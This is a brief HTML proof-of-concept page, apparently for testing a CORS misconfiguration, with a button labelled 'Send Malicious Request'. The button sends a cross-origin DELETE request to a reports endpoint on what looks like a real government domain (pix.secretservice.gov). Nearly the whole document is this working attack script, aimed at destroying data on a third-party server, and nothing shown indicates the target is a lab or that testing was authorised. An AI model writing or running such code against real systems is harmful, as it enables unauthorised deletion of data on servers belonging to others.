<!DOCTYPE html>
<html>
  <body>
    <h2>Testing CORS Misconfiguration (DELETE)</h2>
    <button onclick="sendRequest()">Send Malicious Request</button>

    <script>
      function sendRequest() {
        fetch("https://pix.secretservice.gov/reports", {
          method: "DELETE",
          mode: "cors",
          headers: {
            "Content-Type": "application/json"
          }
        })
        .then(response => response.text())
        .then(data => {
          console.log("Response:", data);
          alert("Request sent! Check console.");
        })
        .catch(error => {
          console.error("Error:", error);
          alert("Error: " + error);
        });
      }
    </script>
  </body>
</html>
